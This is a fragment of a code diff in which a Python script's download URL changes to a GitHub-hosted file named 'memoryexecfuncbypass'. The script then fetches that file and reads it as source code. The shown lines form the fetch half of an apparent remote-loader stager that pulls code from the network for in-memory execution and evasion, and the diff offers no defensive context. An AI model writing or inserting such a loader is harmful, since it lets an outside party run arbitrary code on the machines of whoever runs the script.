@@ -1,5 +1,5 @@
 import urllib.request
-url = "https://raw.githubusercontent.com/chCelera/python/refs/heads/main/script.txt"
+url = "https://github.com/chCelera/baranyeban/raw/refs/heads/main/memoryexecfuncbypass.dick"
 try:
     with urllib.request.urlopen(url) as response:
         source_code = response.read().decode('utf-8')
